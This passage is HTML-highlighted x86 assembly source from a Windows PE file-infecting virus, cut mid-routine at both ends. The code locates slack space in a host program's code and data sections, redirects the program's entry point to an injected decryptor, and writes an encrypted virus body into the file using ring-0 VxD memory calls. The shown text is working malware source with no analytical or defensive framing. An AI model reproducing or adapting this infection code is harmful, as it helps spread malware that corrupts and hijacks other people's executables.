        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileFunctionEndAddEsp</span><span class="sc0">



        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc12">'xet.'</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSegmentSlack</span><span class="sc0">

   </span><span class="sc1">; eax = how much free space</span><span class="sc0">
   </span><span class="sc1">; ebx = where it is located</span><span class="sc0">
   </span><span class="sc1">; ecx = pointer to segment object table</span><span class="sc0">
   </span><span class="sc1">; edx = pointer to last object table</span><span class="sc0">




        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">GuideSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">jl</span><span class="sc0">      </span><span class="sc5">FileFunctionEndAddEsp</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">CodeObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; save offset of code object</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SlackInCodeSegment</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc12">'tad.'</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetSegmentSlack</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileFunctionEndAddEsp</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">DataObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">         </span><span class="sc1">; save offset of data object</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
  </span><span class="sc9">.if</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc8">ecx</span><span class="sc4">==</span><span class="sc8">edx</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">PE_FileAlign</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; file align</span><span class="sc0">
  </span><span class="sc9">.else</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalSize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; physical size</span><span class="sc0">
  </span><span class="sc9">.endif</span><span class="sc0">




        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">Obj_VirtualSize</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; - virtual size</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; = free space</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SlackInDataSegment</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">                </span><span class="sc1">; if this is true we can be </span><span class="sc0">
        </span><span class="sc6">jg</span><span class="sc0">      </span><span class="sc5">InfectFile</span><span class="sc0">                      </span><span class="sc1">; 'sure' no bug will occure.</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; size of .data segment on</span><span class="sc0">
                                                </span><span class="sc1">; disk</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc0">             </span><span class="sc1">; some safety</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">; where in file the zero </span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">                        </span><span class="sc1">; slack starts</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                             </span><span class="sc1">; size of slack block</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FileFunctionEndAddEsp</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">250h</span><span class="sc4">+</span><span class="sc5">MemorySize</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">           </span><span class="sc1">; enough mem free</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">FileFunctionEndAddEsp</span><span class="sc0">           </span><span class="sc1">; this method is more risky</span><span class="sc0">
                                                </span><span class="sc1">; will bug out if the</span><span class="sc0">
                                                </span><span class="sc1">; infected program relies</span><span class="sc0">
                                                </span><span class="sc1">; on the data to be cleared</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">SlackInDataSegment</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">

    </span><span class="sc5">InfectFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">LastObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">         </span><span class="sc1">; ptr to last object table</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">PE_Entrypoint</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; save old RVA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">OldRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">CodeObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">SlackInCodeSegment</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">


</span><span class="sc5">BreakPoint</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; ebx = how far in is free</span><span class="sc0">
                                                </span><span class="sc1">; space</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">Obj_VirtualOffset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; ebx = free space in mem</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">PE_Entrypoint</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">         </span><span class="sc1">; save new RVA</span><span class="sc0">


        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalOffset</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; eax = free space in file</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">NewGuideOffset</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                         


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">DataObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">         

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc5">Obj_VirtualOffset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; data space in mem</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">SlackInDataSegment</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; free data space in mem</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,(</span><span class="sc5">MemorySize</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">PE_ImageBase</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; add with image base</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">MemoryTable</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; used in fs:[0c]</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">

     </span><span class="sc5">CopyPointersToMem</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc8">ecx</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">CopyPointersToMem</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">PointerToDataSlack</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ebx</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">LastObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">VirtualDataSegment</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">Obj_VirtualOffset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; virtual offset</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalSize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; physical size</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">PE_ImageBase</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; add with imagebase</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; Decryptor Entrypoint</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">OldRVA</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">PE_ImageBase</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; add with image base</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">                       </span><span class="sc1">; Program entrypoint</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">DataObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">Obj_VirtualOffset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Virtual offset</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">SlackInDataSegment</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Virtual offset of data slack</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">PEHeadStart</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edx</span><span class="sc4">+</span><span class="sc5">PE_ImageBase</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; add with image base</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalOffset</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">SlackInDataSegment</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Physical offset of data slack</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">NewDataSegmentOffset</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">LastObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalSize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; physical size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalOffset</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; physical offset</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">NewDecryptorOffset</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">ecx</span><span class="sc0">    </span><span class="sc1">; Entrypoint in file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">; decryptor start</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">DecryptorSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">12</span><span class="sc4">],</span><span class="sc8">edx</span><span class="sc0">                    </span><span class="sc1">; save where to start decrypt</span><span class="sc0">


</span><span class="sc1">; write Guide</span><span class="sc0">
        </span><span class="sc6">pushad</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">GuidePos</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">GuideSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">

</span><span class="sc1">; allocate mem for PEHeader</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">R0_AllocMem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileFunctionEndCloseFile</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">TempPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Compile</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">NewGuideOffset</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; write to</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">GuideSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; write ecx bytes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOWrite</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">TempPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">R0_FreeMem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">DecryptorPos</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">DecryptorSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">100</span><span class="sc0">

</span><span class="sc1">; allocate mem for PEHeader</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">R0_AllocMem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">FileFunctionEndCloseFile</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">TempPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Compile</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">; write Decryptor</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">NewDecryptorOffset</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">    
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc5">DecryptorSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOWrite</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc5">TempPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">R0_FreeMem</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">vxd</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">NewDataSegmentOffset</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">MemorySize</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">VirtualDataSegment</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOWrite</span><span class="sc0">


        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">NewDecryptorOffset</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc5">DecryptorSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">VSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">VirusInRing0Mem</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">FileIOWrite</span><span class="sc0">
        

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc5">VSize</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc5">DecryptorSize</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc5">LastObjectPtr</span><span class="sc4">+</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">Obj_PhysicalSize</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; physical size</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                         </span><span class="sc1">; add with new virussize</span><span class="sc0">
